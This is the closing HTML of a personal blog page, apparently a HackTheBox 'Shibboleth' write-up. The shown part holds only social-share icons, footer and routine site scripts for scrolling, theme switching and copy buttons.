                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-253.927,424.544c135.939,0 210.268,-112.643 210.268,-210.268c0,-3.218 0,-6.437 -0.153,-9.502c14.406,-10.421 26.973,-23.448 36.935,-38.314c-13.18,5.824 -27.433,9.809 -42.452,11.648c15.326,-9.196 26.973,-23.602 32.49,-40.92c-14.252,8.429 -30.038,14.56 -46.896,17.931c-13.487,-14.406 -32.644,-23.295 -53.946,-23.295c-40.767,0 -73.87,33.104 -73.87,73.87c0,5.824 0.613,11.494 1.992,16.858c-61.456,-3.065 -115.862,-32.49 -152.337,-77.241c-6.284,10.881 -9.962,23.601 -9.962,37.088c0,25.594 13.027,48.276 32.95,61.456c-12.107,-0.307 -23.448,-3.678 -33.41,-9.196l0,0.92c0,35.862 25.441,65.594 59.311,72.49c-6.13,1.686 -12.72,2.606 -19.464,2.606c-4.751,0 -9.348,-0.46 -13.946,-1.38c9.349,29.426 36.628,50.728 68.965,51.341c-25.287,19.771 -57.164,31.571 -91.8,31.571c-5.977,0 -11.801,-0.306 -17.625,-1.073c32.337,21.15 71.264,33.41 112.95,33.41Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share Shibboleth - HackTheBox on linkedin"
        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fsuszczyk.github.io%2fposts%2fhackthebox%2fshibboleth%2f&amp;title=Shibboleth%20-%20HackTheBox&amp;summary=Shibboleth%20-%20HackTheBox&amp;source=https%3a%2f%2fsuszczyk.github.io%2fposts%2fhackthebox%2fshibboleth%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share Shibboleth - HackTheBox on reddit"
        href="https://reddit.com/submit?url=https%3a%2f%2fsuszczyk.github.io%2fposts%2fhackthebox%2fshibboleth%2f&title=Shibboleth%20-%20HackTheBox">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share Shibboleth - HackTheBox on facebook"
        href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fsuszczyk.github.io%2fposts%2fhackthebox%2fshibboleth%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share Shibboleth - HackTheBox on whatsapp"
        href="https://api.whatsapp.com/send?text=Shibboleth%20-%20HackTheBox%20-%20https%3a%2f%2fsuszczyk.github.io%2fposts%2fhackthebox%2fshibboleth%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share Shibboleth - HackTheBox on telegram"
        href="https://telegram.me/share/url?text=Shibboleth%20-%20HackTheBox&amp;url=https%3a%2f%2fsuszczyk.github.io%2fposts%2fhackthebox%2fshibboleth%2f">
        <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28">
            <path
                d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
        </svg>
    </a>
</div>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2022 <a href="https://suszczyk.github.io">Mateusz Suszczyk</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerText = 'copy';

        function copyingDone() {
            copybutton.innerText = 'copied!';
            setTimeout(() => {
                copybutton.innerText = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
